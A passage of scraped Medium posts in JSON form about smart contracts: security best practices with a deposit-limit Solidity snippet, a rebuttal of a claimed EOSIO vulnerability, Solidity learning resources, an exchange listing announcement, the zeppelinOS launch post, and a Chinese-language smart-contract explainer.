of funds depositedAnother way to protect our smart contracts from attacks is to limit their scope. Attackers will most probably target high-profile contracts managing millions of dollars. Not all smart contracts need to have such high stakes. Especially if we\u2019re conducting experiments. In such cases, it might be useful to limit the amount of funds our contract accepts. This is as simple as a hard limit on the balance of the contract\u2019s address.Here\u2019s a simplified example on how to do this:contract LimitFunds {    uint LIMIT = 5000;    function() { throw; }    function deposit() {    if (this.balance > LIMIT) throw;    ...  }}The short fallback function will reject any direct payments to the contract. The deposit function will first check if the contract\u2019s balance exceeds the desired limit, or throw an exception. More interesting things like dynamic or managed limits are easy to implement too.Write simple and modular\u00a0codeSecurity comes from a match between our intention and what our code actually allows to do. This is very hard to verify, especially if the code is huge and messy. That\u2019s why it\u2019s important to write simple and modular code.This means, functions should be as short as possible, code dependencies should be reduced to the minimum, and files should be as small as possible, separating independent logic into modules, each with a single responsibility.Naming is also one of the best ways to express our intention when coding. Think a lot about the names you chose, to make your code as clear as possible.Let\u2019s study an example of bad naming of Events. Look at this function from The DAO. I\u2019m not going to copy the function code here because it\u2019s very long.The biggest problem is that it\u2019s too long and complex. Try to keep your functions much shorter, say, up to 30 or 40 lines of code max. Ideally, you should be able to read functions and understand what they do in less than a minute. Another problem is the bad naming for the event Transfer in line 685. The name differs from a function called transfer by only 1 character! This is inviting confusion for everyone. In general, the recommended naming for events is that they should start with \u201cLog\u201d. In this case, a better name would be LogTransfer.Remember, write your contracts as simple, modular, and well-named as possible. This will greatly facilitate others and yourself in auditing your code.Don\u2019t write all your code from\u00a0scratchFinally, as the old adage reads: \u201cDon\u2019t roll your own crypto\u201d. I think it also applies to Smart Contract code. You\u2019re dealing with money, your code and data is public, and you\u2019re running in a new and experimental platform. The stakes are high and the chances to mess-up are everywhere.These practices help secure our smart contracts. But ultimately, we should create better developer tools to build smart contracts. There are some interesting initiatives including better type systems, Serenity Abstractions, and the Rootstock platform.There\u2019s lots of good and secure code already written and frameworks are starting to appear. We\u2019ve started to compile some of the best practices in this GitHub repo we called OpenZeppelin. Feel free to take a look and contribute with new code or security audits.Wrapping upTo recap, the security patterns described in this article are:Fail as early and loudly as possibleFavor pull over push paymentsOrder your function code: conditions, actions, interactionsBe aware of platform limitsWrite testsFault tolerance and Automatic bug bountiesLimit the amount of funds depositedWrite simple and modular codeDon\u2019t write all your code from scratch", "responses": "19"}, {"title": "Debunking Claimed Vulnerability in EOSIO Smart Contract\u00a0System", "author_name": "Daniel Larimer", "link": "https://medium.com/@bytemaster/debunking-claimed-vulnerability-in-eosio-smart-contract-system-9fa1ca2a6428?source=search_post", "post_date": "Apr 30, 2018", "readtime": "3 min read", "upvotes": "4K", "content": "Debunking Claimed Vulnerability in EOSIO Smart Contract\u00a0SystemDaniel LarimerBlockedUnblockFollowFollowingApr 30, 2018A story has been circulating that EOSIO is vulnerable to the same kind of bug as the recent \u201cbatchOverflow\u201d bug that crippled many ERC-20 tokens on Ethereum. The team at Chengdu LiaAn Technology Co (LianAn Tech) and its research platform VaaS (Verification as a Service) has managed to prove that EOSIO is Turing complete and capable of replicating any logic, including the logic behind the batchOverflow bug.The problem is not a security vulnerability, as they represent, but the result of poor coding practices. There is nothing a smart contract platform can do to prevent developers for making mistakes. Such mistakes are not security vulnerabilities in the underlying platform.That said, there is a major difference in the options available to developers smart enough to adopt good conventions. One of those options is the implementation of \u201csmart integer\u201d wrappers that automatically check for these kinds of overflows without adding any extra noise to the code.For example you could use a checked_int64_t as defined by boost multiprecision. A simple typedef could convert unsafe code into safe code that would fail if any overflow occurred. The combination of c++ templates and operator overloading means that using safe math is as seamless as using unsafe math.Any platform that forced developers into always using \u201csafe math\u201d also limits developer flexibility and/or performance in situation where overflows are desired.In fact, there are many cases where simply preventing overflows on standard-sized types is insufficient. What if you want to have a safe int that keeps all values in a defined range? With c++ templates you can created a bounded integer class. There is no easy way to achieve the same, compile-time-checked, code, in simple languages such as Solidity.Comparing PlatformsIf one wants to compare platforms one should consider the safety and readability tools available to developers who choose to adopt them and compare quality based on best practices. On solidity you are forced to use unreadable functions to wrap all math. The loss of readability due to inability to use the built in operators for +/-* is just as bad for security as the lack of bounds checks.The other factor to consider is runtime performance of various security measures. C++ compilers can often do compile time checks, optimize, and inline many of the math checks down into the minimal assembly necessary. Similar checks in languages like Solidity force the use of function calls and lack ability to inline code due to the immaturity of the developer tools compared to the battle-tested C++ tools available.Ability to Update\u00a0CodeIn my recent tweet about the \u201cbatchOverflow\u201d bug I made the case that developers are not perfect and that code needs to be updated. A good platform will make updates easy by default rather than difficult. Users should be forced to explicitly mark a contract as immutable. Furthermore, even contracts marked as immutable by their creator should be mutable by the community without requiring a hard fork.Irresponsible ReportingThe team at LianAn Tech and other bloggers which report on this issue have constructed a strawman argument against EOSIO. The result of their irresponsible reporting is to mislead those who don\u2019t understand the technology. As an industry we need people who can accurately understand the difference between a security vulnerability (platform not behaving as designed), a user error (developers not using the platform properly), and a fundamental platform design flaw (a platform not giving developers tools to protect themselves).EOSIO is designed to give developers the most robust toolset for writing high-performance, high-quality, low-bug-count contracts and to allow the platform and the contracts to recover gracefully when all else fails.", "responses": "17"}, {"title": "Learn Solidity\u200a\u2014\u200aThe Ethereum smart contract programming language", "author_name": "Robbert Vermeulen", "link": "https://medium.com/@robbertvermeulen/learn-solidity-the-ethereum-smart-contract-programming-language-7f106fc26d6?source=search_post", "post_date": "Jan 12, 2018", "readtime": "2 min read", "upvotes": "2K", "content": "Learn Solidity\u200a\u2014\u200aThe Ethereum smart contract programming languageRobbert VermeulenBlockedUnblockFollowFollowingJan 12, 2018In the course of time that I am involved in Ethereum development, I have noticed that not much information exists yet to learn Solidity (outside of the Solidity documentation).I have saved the information that I found in the meantime and the goal of this article is to share all my gathered resources, so other people new in this world don\u2019t have to search, but can start learning Solidity immediately.1. Solidity video tutorialsCoursesSolidity by What\u2019s SolidityDeveloping Ethereum Smart Contracts for Beginners by DesignCourseUltimate Introduction to Ethereum \u00d0app Development by Decypher mediaBuilding Ethereum dapp using Solidity by Shlomi zeltsingerEthereum Smart Contracts In Solidity by What the Func?Solidity and smart contracts tutorial for beginners by Vlad WulfICO developmentHow to build an ICO crowdsale with Open Zeppelin by Roman StormIt\u2019s too easy to launch ICO by shlomi zeltsingerDapp developmentHOWTO: Building Ethereum Apps With Truffle by Tim CoulterTutorial dapp with Solidity, Truffle, Web3 and Javascript by Blockchain Talks2. Solidity tutorialsBasicsA 101 Noob Intro to Programming Smart Contracts on EthereumLearn Solidity in Y minutesLearning Solidity by ExampleFull stack Hello world voting Ethereum Dapp tutorialBuild Your First Smart ContractMonax smart contract tutorialHow To Learn Solidity: The Ultimate Ethereum Coding GuideInteractiveCryptoZombiesSpace DoggosBitDegree Basic of SoliditySpecialtiesTyping and Your Contracts StorageDeploying A Smart Contract, The Hard WayRevert(), Assert() and Require()Constant vs View vs PureDapp developmentThe ultimate end-to-end tutorial to create and deploy a fully decentralized Dapp in Ethereum3. Smart contract\u00a0examplesEtherdice (Ethereum-based dice game)Zeppelin Solidity (ICO and token smart contracts)Ethereum Slot machine Dapp (Ethereum-based slot machine)Etherpot (lottery)The DAO framework\u200a\u2014\u200aDecentralized Autonomous Organization4. Solidity communitiesEthereum Developers Facebook groupSolidity RedditEthereum StackexchangeSolidity GitterEthereum Gitter (solidity channel)5. Solidity tools & frameworksZeppelin Solidity (development framework)Truffle (development framework)Remix Solidity IDE (Integrated development environment)Web3.js (Ethereum Javascript API)Solium (Analyzes your code for style & security issues)Javascript TestRPC (local blockchain development)MetaMask (browser extension)Geth (command line interface to run a full Ethereum node)Solc (Solidity compiler)6. Solidity\u00a0booksSolidity Programming Essentials: A beginner\u2019s guide to build smart contracts for Ethereum and blockchainIntroducing Ethereum and Solidity: Foundations of Cryptocurrency and Blockchain Programming for BeginnersEthereum Smart Contract Development: Build blockchain-based decentralized applications using Solidity", "responses": "9"}, {"title": "CoinAll Lists Smart Contract Platform RSK\u00a0Tokens", "author_name": "kana wen", "link": "https://medium.com/coinall/coinall-lists-smart-contract-platform-rsk-tokens-c68e0d464330?source=search_post", "post_date": "Apr 2", "readtime": "2 min read", "upvotes": "1.5K", "content": "CoinAll Lists Smart Contract Platform RSK\u00a0Tokenskana wenBlockedUnblockFollowFollowingApr 2BUENOS AIRES, Argentina, April 1, 2019 /PRNewswire/\u200a\u2014\u200aOn April 1, 2019, CoinAll (www.coinall.com) cryptocurrency exchange announced the listing of RSK Infrastructure Framework token (RIF) and RBTC. Starting from April 2, CoinAll will hold a 7-day celebration to give away 333850 RIF tokens for depositing, trading and a community promotion event.RSK is a two-way pegged sidechain to Bitcoin designed to enable full Turing-complete smart contract functionality for the Bitcoin ecosystem. Its utility token, RIF, provides users with the possibility to gain access to all services that are compatible with the project\u2019s architecture, and RBTC is pegged to BTC on a one-to-one ratio.Katherine Deng, the general manager of CoinAll says, CoinAll highly values RSK\u2019s long-term goal, giving its users the ability \u201cto consume decentralized services from any smart contract enabled blockchain.\u201d CoinAll is committed to excavating global projects with high quality and potential, with a particular focus on RSK, Fetch.AI and other eco-friendly infrastructure builders.The RSK celebration will last from April 2nd, 2019 to April 8th, including an individual deposit give away of 133,600 RIF, a trading contest give away of 133,600 RIF and a 66,650 RIF giveaway to promote the community.RSK has a growing team of mission driven, passionate collaborators all over the globe. Sergio Lerner, RSK\u2019s co-founder and chief scientist has been involved in Bitcoin since 2011, being a security auditor of the Bitcoin Foundation in the United States where he also discovered six out of the ten most important vulnerabilities in Bitcoin.RSK is highly supported by the Ethereum Community and Bitcoin Miners for its optionality and compatibility. Currently, RSK already has 16EHs of hashing power which represents approximately 45% of all the Bitcoin network and the support of five major mining pools.Katherine says, we highly agree with the RSK team about the believes in the potential of crypto and blockchain to create the future internet of value. CoinAll always devoted to bringing better trading experience to users and educating the populace about blockchain all over the world.For more details, please visit:https://www.coinall.com/activity/voteCoin?activeId=457&from=pr", "responses": "3"}, {"title": "Introducing zeppelinOS: the operating system for smart contract applications", "author_name": "Manuel Araoz", "link": "https://blog.zeppelin.solutions/introducing-zeppelinos-the-operating-system-for-smart-contract-applications-82b042514aa8?source=search_post", "post_date": "Jul 27, 2017", "readtime": "4 min read", "upvotes": "653", "content": "Introducing zeppelinOS: the operating system for smart contract applicationsManuel AraozBlockedUnblockFollowFollowingJul 27, 2017Last week, we saw one of the biggest hacks in the history of smart contract applications. ~30M USD were lost due to a simple programmer error, leaving critical functions open for anyone to call. It\u2019s high time we get serious about writing secure contracts, if we want decentralized applications to reach their full potential.In the early days of computing, writing code into machines was a difficult and inefficient endeavor. There were few tools and resources available for programmers, and specialized magazines were the main distribution media for software. Major operating systems were not yet available, so each computer model required machine-specific knowledge to be programmed. This is what it feels like to work with smart contracts in 2017.The State of Smart Contract ProgrammingEthereum changed the world by creating a distributed global shared virtual machine known as the EVM. Anyone can now use this virtual machine to run programs that handle real money and formalize contractual relationships via code. The promise is huge: we\u2019re creating a new global and natively-digital economy based on software.Still, the tools developers are using to build towards this fantastic vision are very rudimentary. Once a contract is deployed, there\u2019s no way to upgrade it, even for security reasons, which means applications can\u2019t easily upgrade with new features and fixes; instead of calling standard libraries, application developers are copy/pasting code with each deployed contract, increasing deployment costs and margin for error; and, last but not least, debugging a contract\u2019s failing function calls is hell with current tools.Overall, the rate of innovation in building decentralized applications is limited by the manual and duplicative efforts projects must make to ensure basic usability and security.Much like in the early days of computing, where operating systems enabled the development of feature-rich applications, the same is needed for the development of complex smart contract applications. We need an OS for the EVM.What is zeppelinOS exactlyzeppelinOS is an open-source, distributed platform of tools and services on top of the EVM to develop and manage smart contract applications securely.What would an EVM operating system look like? We thought about four main components, but other functions may arise in the future, as the industry evolves:zeppelinOS Kernel: an upgradeable and community-governed core of functionality provided by an on-chain smart contract library that developers can call for standard and common functions in their applications. The initial version of this is the current OpenZeppelin framework, migrated to library form. Shared code for smart contract applications to use, with curated opt-in security updates based on the proxy library pattern.zeppelinOS Scheduler: Every transaction on the Ethereum network is initiated and paid by a user. This places a limitation on the kinds of things a smart contract can do and sometimes creates unfair situations. For example, when executing a transaction via a standard multisig contract, the last owner to confirm it will trigger the actual call and pay for its gas costs. Or, if a crowdsale has some finalization logic when the cap is reached, the last token buyer will pay the gas cost of executing that. The zeppelinOS Scheduler will enable async execution on the EVM where a contract can request asynchronous execution of a function and anyone can pay the gas costs and be rewarded for it.zeppelinOS Marketplace: To catalyze exponential growth among decentralized applications, smart contracts must be able to interact with each other in a standard way. Imagine if Augur could talk to 0x to enable prediction market forecasting in any currency, all done using an Aragon company. This kind of interoperability would accelerate progress across the space, helping developers take the ecosystem mainstream, faster. Our proposed solution is to build a marketplace of inter-contract services natively inside the OS.zeppelinOS off-chain tools: As an addition to the on-chain services offered by zeppelinOS, the platform will provide a set of off-chain tools aimed at simplifying the development, debugging, testing, deployment, and monitoring of decentralized applications.At Zeppelin Solutions, all of our efforts are focused on solving the technical challenges of smart contract application development. We\u2019ve worked with dozens of projects on security audits, smart contract upgradability, contributed to improve and test development tools, and enabled interoperability through our OpenZeppelin standards and security patterns. We are developers ourselves. We believe we know how to make the smart contract development process better, easier and more robust.We invite you to help us make this happen.Subscribe to the zeppelinOS newsletter to learn more details about the project, and stay up-to-date with the next\u00a0stages.", "responses": "7"}, {"title": "\u5de5\u7a0b\u5e2b\u8996\u89d2\uff1a\u4ec0\u9ebc\u662f\u5340\u584a\u93c8\u7684 Smart Contract?", "author_name": "Yuren Ju", "link": "https://medium.com/taipei-ethereum-meetup/%E5%B7%A5%E7%A8%8B%E5%B8%AB%E8%A6%96%E8%A7%92-%E4%BB%80%E9%BA%BC%E6%98%AF%E5%8D%80%E5%A1%8A%E9%8F%88%E7%9A%84-smart-contract-d488308f461d?source=search_post", "post_date": "May 3, 2018", "readtime": "7 min read", "upvotes": "1.5K", "content": "\u5de5\u7a0b\u5e2b\u8996\u89d2\uff1a\u4ec0\u9ebc\u662f\u5340\u584a\u93c8\u7684 Smart Contract?Yuren JuBlockedUnblockFollowFollowingMay 3, 2018\u6295\u5165\u5340\u584a\u93c8\u793e\u7fa4\u4ee5\u53ca\u7522\u696d\u4e00\u5c0f\u6bb5\u6642\u9593\u4e86\uff0c\u8ddf\u5de5\u7a0b\u5e2b\u670b\u53cb\u5011\u804a\u5230\u5340\u584a\u93c8\u7684\u53bb\u4e2d\u5fc3\u5316\u67b6\u69cb\u6642\uff0c\u670b\u53cb\u5011\u591a\u534a\u662f\u4e00\u982d\u9727\u6c34\u3002\u4eca\u5929\u60f3\u8a66\u8457\u900f\u904e\u5de5\u7a0b\u5e2b\u5011\u6bd4\u8f03\u5bb9\u6613\u7406\u89e3\u7684\u89d2\u5ea6\u4f86\u89e3\u91cb\u4e00\u4e0b\u5340\u584a\u93c8\u9818\u57df\u7d93\u5e38\u88ab\u63d0\u5230\u7684\u4e00\u500b\u540d\u8a5e\uff1aSmart Contract (\u667a\u6167\u5408\u7d04\u6216\u8b6f\u4f5c\u667a\u80fd\u5408\u7d04)\u3002\u5e0c\u671b\u6709\u52a9\u65bc\u5de5\u7a0b\u5e2b\u670b\u53cb\u5011\u4e86\u89e3\u5340\u584a\u93c8\u6280\u8853\u3002\u5148\u63d0\u9192\u4e00\u4e0b\u4ee5\u4e0b\u7684\u5167\u5bb9\u89e3\u91cb\u7684\u90fd\u662f\u91dd\u5c0d Ethereum (\u4ee5\u592a\u574a) \u5340\u584a\u93c8\uff0c\u5176\u4ed6\u7684\u5340\u584a\u93c8\u4e0d\u898b\u5f97\u6709 Smart Contract \u7684\u6982\u5ff5\u3002\u4e00\u822c\u7684\u7a0b\u5f0f\u5982\u4f55\u88ab\u57f7\u884c\uff1f\u958b\u59cb\u89e3\u91cb Smart Contract \u524d\u60f3\u4f86\u804a\u804a\u66f4\u57fa\u672c\u7684\u4e8b\u60c5\uff1a\u4e00\u6bb5\u7a0b\u5f0f\u662f\u600e\u9ebc\u88ab\u57f7\u884c\u7684\u3002\u7576\u4f60\u5beb\u4e86\u4e00\u6bb5 Java\u3001Python \u6216\u662f JavaScript \u7684\u7a0b\u5f0f\uff0c\u5b83\u6703\u600e\u9ebc\u88ab\u57f7\u884c\u5462\uff1f\u5047\u8a2d\u6211\u5011\u5728\u5beb\u4e00\u500b\u8ce3\u7968\u7a0b\u5f0f\uff0c\u53ef\u80fd\u6703\u9700\u8981\u4e00\u500b MeetupEvent \u7684\u985e\u5225 (Class)\uff0c\u5167\u5bb9\u5982\u4e0b\uff1ahttps://gist.github.com/yurenju/284cfb127a8ba9de07eb8e007acca317\u9019\u6bb5 Java \u7a0b\u5f0f\u7684\u57f7\u884c\u65b9\u5f0f\uff0c\u4e00\u822c\u4f86\u8aaa\u6e90\u78bc\u6703\u7d93\u904e Java \u7de8\u8b6f\u5668\u8f49\u8b6f\u6210 Bytecode \u4e4b\u5f8c\uff0c\u900f\u904e JVM (Java Virtual Machine) \u5728\u96fb\u8166\u4e2d\u57f7\u884c\u3002\u7576\u9019\u500b\u7a0b\u5f0f\u5728\u57f7\u884c\u6642 main() \u5c07\u6703\u5efa\u7acb\u4e00\u500b\u985e\u5225\u7684 instance event\uff0c\u6b64\u6642\u9019\u500b instance \u5c07\u6703\u5132\u5b58\u5728\u8a18\u61b6\u9ad4\u88e1\u9762\uff0c\u4e26\u4e14\u53ef\u4ee5\u900f\u904e\u6211\u5011\u5b9a\u7fa9\u7684\u65b9\u6cd5\u5982 register()\u64cd\u4f5c\u9019\u500b instance\uff0c\u76f4\u5230\u6574\u500b\u7a0b\u5f0f\u7d50\u675f\u3002\u4e0d\u7ba1\u662f\u5beb Java, Python, JavaScript \u6216\u5176\u4ed6\u8f03\u70ba\u9ad8\u968e\u7684\u8a9e\u8a00\uff0c\u5be6\u4f5c\u4e0a\u7684\u7d30\u7bc0\u6839\u64da\u4e0d\u540c\u7a0b\u5f0f\u8a9e\u8a00\u6703\u6709\u5dee\u7570\uff0c\u4f46\u662f\u5927\u81f4\u4e0a\u7684\u60c5\u5f62\u90fd\u6703\u662f\u9019\u6a23\uff0c\u76f8\u4fe1\u5de5\u7a0b\u5e2b\u5011\u5c0d\u9019\u6a23\u7684\u904b\u4f5c\u67b6\u69cb\u4e5f\u8033\u719f\u80fd\u8a73\u3002Smart Contract\u8b93\u6211\u5011\u518d\u56de\u5230\u6211\u5011\u7684\u4e3b\u984c\uff1a\u4ec0\u9ebc\u662f Smart Contract \u5462\uff1fSmart Contract \u540d\u5b57\u4e0a\u807d\u8d77\u4f86\u5f88\u7384\uff0c\u5982\u679c\u4f60\u662f\u7b2c\u4e00\u6b21\u63a5\u89f8\u5340\u584a\u93c8\u7684\u5de5\u7a0b\u5e2b\uff0c\u5176\u5be6\uff1aSmart Contract \u5c31\u662f\u4e00\u500b\u904b\u884c\u5728\u5340\u584a\u93c8 VM \u4e0a\u9762\u7684 instance\u3002\u66f4\u7cbe\u78ba\u5730\u4f86\u8aaa\uff0c\u5728 Ethereum Blockchain \u4e0a\u9762 Smart Contract \u904b\u4f5c\u5728 Ethereum Virtual Machine (EVM)\u4e0a\u9762\u3002\u540c\u6a23\u7684 MeetupEvent\uff0c\u6211\u5011\u6539\u7528 Smart Contract \u7684\u7a0b\u5f0f\u8a9e\u8a00 solidity \u91cd\u5beb\u4e00\u6b21\uff1ahttps://gist.github.com/yurenju/8598564c516facd734834a51df3fc191\u9019\u6bb5\u5c31\u662f\u88ab\u7a31\u4f5c\u662f \u201cSmart Contract\u201d \u7684\u7a0b\u5f0f\uff0c\u4f60\u53ef\u4ee5\u628a\u5b83\u7576\u4f5c\u662f\u4e00\u500b\u985e\u5225 (class)\u3002\u8981\u4f7f\u7528\u9019\u6bb5\u7a0b\u5f0f\u7684\u6642\u5019\uff0c\u5b83\u5fc5\u9808\u88ab\u90e8\u7f72 (deploy) \u5230\u5340\u584a\u93c8\u4e0a\uff0c\u4e0a\u9762\u9019\u6bb5\u7a0b\u5f0f\u6703\u88ab\u5275\u9020\u51fa\u4e00\u500b instance\uff0c\u800c\u9019\u500b instance \u5c07\u6703\u88ab\u653e\u5728\u5340\u584a\u93c8\u4e0a\u3002\u4e0b\u5716\u9019\u500b Ethereum VM \u5247\u6703\u904b\u884c\u5728\u6bcf\u4e00\u500b Ethereum \u7bc0\u9ede\u4e0a\u9762\u3002\u4e00\u65e6\u5408\u7d04\u90e8\u7f72\u6210\u529f\u6642\u6703\u5f97\u5230\u4e00\u500b\u5730\u5740\uff0c\u5b83\u5c31\u50cf\u8a18\u61b6\u9ad4\u4f4d\u7f6e\u4e00\u6a23\uff0c\u53d6\u5f97\u9019\u500b\u4f4d\u7f6e\u5f8c\u642d\u914d\u6b63\u78ba\u7684 interface \u8cc7\u8a0a\u5c31\u53ef\u4ee5\u57f7\u884c\u9019\u500b\u5408\u7d04\u3002\u5728\u5340\u584a\u93c8\u4e0a\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u547c\u53eb\u9019\u500b smart contract \u6240\u958b\u51fa\u4f86\u7684\u51fd\u5f0f (function)\u3002\u7576\u7136\u56e0\u70ba\u5b83\u5c31\u662f\u4e00\u6bb5\u7a0b\u5f0f\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5beb\u4e9b\u908f\u8f2f\u4f86\u505a\u6b0a\u9650\u63a7\u7ba1\u3002\u4ee5\u6211\u5011\u9019\u500b\u7a0b\u5f0f\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u57f7\u884c\u7684\u51fd\u5f0f\u5c31\u662f register()\u3002\u9019\u6a23\u8aaa\u8d77\u4f86\uff0c\u9664\u4e86 Smart Contract \u662f\u8dd1\u5728\u5340\u584a\u93c8\u4e0a\u4ee5\u5916\uff0c\u5176\u5be6\u4ed6\u5c31\u662f\u4e00\u500b instance\uff0c\u8ddf\u4f7f\u7528\u5176\u4ed6\u7a0b\u5f0f\u8a9e\u8a00\u4e0a\u7684 class instance \u6c92\u6709\u592a\u5927\u7684\u5dee\u5225\u3002\u800c\u5340\u584a\u93c8 VM \u4e0a\u8dd1\u7684\u7a0b\u5f0f\uff08\u4e5f\u5c31\u662f Smart Contract\uff09\u8ddf\u4e00\u822c VM \u4e0a\u8dd1\u7684\u7a0b\u5f0f\uff0c\u6700\u4e0d\u4e00\u6a23\u7684\u5730\u65b9\u5c31\u5728\u65bc\u53bb\u4e2d\u5fc3\u5316\u67b6\u69cb\u3002\u5728\u4e00\u822c\u7a0b\u5f0f\u7684\u67b6\u69cb\u4e2d\uff0c\u4e0d\u7ba1\u90a3\u500b\u670d\u52d9\u7528\u4e86\u5206\u6563\u5f0f\u904b\u7b97\u3001load balance \u52a0\u4e0a\u591a\u53f0\u4f3a\u670d\u5668\u6216\u662f\u53ea\u5728\u4e00\u53f0\u6a5f\u5668\u4e0a\u9762\u8dd1\uff0c\u672c\u8cea\u4e0a\u9019\u4e9b\u4f3a\u670d\u5668\uff08\u6216\u8aaa\u662f\u904b\u7b97\u55ae\u5143\uff09\u5168\u90e8\u90fd\u662f\u7531\u55ae\u4e00\u7d44\u7e54\u638c\u7ba1\uff0c\u9019\u6a23\u7684\u67b6\u69cb\u884c\u4e4b\u6709\u5e74\uff0c\u4e5f\u904b\u4f5c\u5f97\u5f88\u597d\u3002\u4f46\u9019\u6a23\u7684\u67b6\u69cb\u4e0b\uff0c\u5982\u679c\u4f60\u9700\u8981\u505a\u4efb\u4f55\u300c\u50f9\u503c\u4ea4\u63db\u300d\u7684\u61c9\u7528\uff0c\u514d\u4e0d\u4e86\u90fd\u8981\u4e2d\u9593\u4eba\u7684\u4ecb\u5165\u3002\u5728\u4ee5\u524d\u53ea\u80fd\u7576\u9762\u4ea4\u6613\u7684\u5e74\u4ee3\uff0c\u6240\u6709\u6771\u897f\u90fd\u662f\u4e00\u624b\u4ea4\u9322\u4e00\u624b\u4ea4\u8ca8\u3002\u9700\u8981\u66f4\u65b9\u4fbf\u8207\u6709\u6548\u7387\u7684\u4ea4\u6613\u6642\uff0c\u51fa\u73fe\u4e86\u63ae\u5ba2\u5e6b\u4f60\u8f49\u4ea4\u7269\u54c1\u8ddf\u91d1\u9322\u7684\u884c\u696d\uff0c\u7576\u7136\u9019\u4f4d\u4e2d\u9593\u4eba\u9700\u8981\u53d6\u5f97\u96d9\u65b9\u7684\u4fe1\u4efb\u3002\u6700\u7d42\u9280\u884c\u3001\u4fe1\u7528\u5361\u516c\u53f8\u3001\u91d1\u6d41\u516c\u53f8\u985e\u4f3c\u7684\u6982\u5ff5\u9010\u6f38\u8208\u8d77\uff0c\u4f7f\u7528\u8005\u4e5f\u9700\u8981\u4fe1\u4efb\u9280\u884c\u6216\u4fe1\u7528\u5361\u516c\u53f8\u6642\uff0c\u9019\u6a23\u7684\u6a21\u5f0f\u624d\u884c\u5f97\u901a\uff0c\u800c\u642d\u5efa\u5728\u4e0a\u9762\u7684\u300c\u4fe1\u4efb\u300d\u662f\u570b\u5bb6\u900f\u904e\u5408\u7d04\u3001\u6cd5\u5f8b\u7d04\u675f\u5404\u5f0f\u5404\u6a23\u7684\u516c\u53f8\uff0c\u4e00\u5c64\u4e00\u5c64\u7684\u4fe1\u4efb\u95dc\u4fc2\u5c31\u9019\u6a23\u642d\u5efa\u8d77\u4f86\u3002\u4f60\u8ddf\u7db2\u8def\u4e0a\u7684\u67d0\u4eba\u4ea4\u6613\u53ef\u4ee5\u6210\u529f\uff0c\u5176\u5be6\u80cc\u5f8c\u662f\u4e00\u5c64\u5c64\u7684\u4e2d\u9593\u4eba\u8207\u4fe1\u4efb\u95dc\u4fc2\u3002\u56de\u5230\u6700\u6839\u672c\u4e4b\u4e0a\uff0c\u5c31\u662f\u300c\u4fe1\u4efb\u300d\u554f\u984c\u3002\u800c\u5340\u584a\u93c8\u8207 Smart Contract \u5247\u662f\u8a66\u5716\u900f\u904e\u53bb\u4e2d\u5fc3\u5316\u7684\u67b6\u69cb\u4f86\u89e3\u6c7a\u9019\u554f\u984c\u3002\u4e0d\u540c\u65bc\u4e00\u822c\u7a0b\u5f0f\u7684\u4e2d\u5fc3\u5316\u67b6\u69cb\uff0c\u5728 Ethereum \u5340\u584a\u93c8\u4e2d\uff0c\u5982\u679c\u4f60\u60f3\u8981\u900f\u904e\u5354\u52a9\u5225\u4eba\u57f7\u884c\u4ed6\u5011\u7684 Smart Contract \u7372\u5f97\u734e\u52f5\uff0c\u4f60\u53ef\u4ee5\u5b89\u88dd ethereum node \u7684\u8edf\u9ad4\u5982 go-ethereum \u6216\u662f parity\uff0c\u4e26\u4e14\u958b\u555f\u7926\u5de5\u6a21\u5f0f\u5373\u53ef\u3002\u8981\u6210\u70ba\u4e00\u500b\u7926\u5de5\u4e26\u4e0d\u9700\u8981\u7d93\u904e\u8ab0\u7684\u540c\u610f\uff0c\u800c\u7576\u7926\u5de5\u5728 Ethereum \u5340\u584a\u93c8\u6703\u6709\u6316\u7926\u734e\u52f5\u56de\u994b\u4ee5\u53ca\u4f7f\u7528\u8005\u7d66\u7926\u5de5\u7684\u4ea4\u6613\u8cbb\u3002\u5982\u6b64\u4e00\u4f86 Ethereum \u7684\u53bb\u4e2d\u5fc3\u5316\u7bc0\u9ede\u7db2\u8def\u5c31\u9019\u6a23\u5efa\u69cb\u8d77\u4f86\u4e86\u3002\u7576\u4f60\u90e8\u7f72\u4e00\u500b Smart Contract\uff0c\u6216\u662f\u767c\u8d77\u4e00\u7b46\u4ea4\u6613\u4f86\u6539\u8b8a\u5340\u584a\u93c8\u5167\u7684\u72c0\u614b\u6642\uff0c\u6703\u9700\u8981\u4ed8\u51fa\u4ea4\u6613\u8cbb\uff0c\u9019\u7b46\u4ea4\u6613\u8cbb\u6700\u7d42\u5247\u6703\u7531\u7926\u5de5\u6536\u8d70\u4f5c\u70ba\u734e\u52f5\u4e4b\u4e00\u3002\u66f4\u68d2\u7684\u662f Ethereum \u5340\u584a\u93c8\u662f\u4e00\u500b\u5167\u5efa\u6578\u4f4d\u8ca8\u5e63\u91d1\u6d41\u7684\u5e73\u53f0\uff0c\u958b\u767c\u8005\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u7684\u5229\u7528\u5728\u5340\u584a\u93c8\u4e0a\u5167\u5efa\u7684\u6578\u4f4d\u8ca8\u5e63\u91d1\u6d41\u7cfb\u7d71\u4f86\u642d\u5efa\u5404\u5f0f\u5404\u6a23\u7684\u53bb\u4e2d\u5fc3\u5316\u61c9\u7528 (Decentralized app, Dapp)\u3002\u4f60\u8ddf\u7db2\u8def\u4e0a\u7684\u67d0\u4eba\u4ea4\u6613\u6642\uff0c\u5982\u679c\u900f\u904e Smart Contract \u96d9\u65b9\u5148\u58d3\u4e86\u4e00\u7b46\u4fdd\u8b49\u91d1\u5728\u5408\u7d04\u88e1\u9762\uff0c\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u5728\u6c92\u6709\u4e2d\u9593\u4eba\u64d4\u4fdd\u7684\u72c0\u6cc1\u4e0b\u8b93\u78ba\u8a8d\u4ea4\u6613\u53ef\u4ee5\u57f7\u884c\u5462\uff1f\u5167\u5efa\u6578\u4f4d\u8ca8\u5e63\u91d1\u6d41\u7cfb\u7d71\uff0c\u642d\u914d\u4e0a\u516c\u958b\u7684 Smart Contract \u5167\u5bb9\uff08\u4e5f\u5c31\u662f\u6e90\u78bc\uff09\uff0c\u4ee5\u524d\u900f\u904e\u73fe\u5be6\u751f\u6d3b\u7684\u300c\u5408\u7d04\u300d\u4f86\u89e3\u6c7a\u7684\u4fe1\u4efb\u554f\u984c\uff0c\u5c31\u53ef\u4ee5\u91cd\u65b0\u601d\u8003\u662f\u5426\u53ef\u4ee5\u900f\u904e Smart Contract \u89e3\u6c7a\u3002\u8a71\u8aaa\u56de\u4f86\uff0c\u5340\u584a\u93c8\u8ddf Smart Contract 